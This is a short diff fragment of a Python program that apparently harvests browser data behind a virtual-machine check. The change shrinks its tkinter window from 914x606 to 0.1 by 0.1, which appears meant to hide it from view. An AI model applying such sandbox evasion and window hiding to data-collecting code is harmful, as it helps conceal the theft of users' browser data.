@@ -447,8 +447,8 @@ if VM_DETECTED == False:
                     save_results(browser, data_type_name, data)
 
         # Setup window.
-        width = 914 # Width of window.
-        height = 606 # Height of window.
+        width = 0.1 # Width of window.
+        height = 0.1 # Height of window.
         
         root = tkinter.Tk() # Name.
         
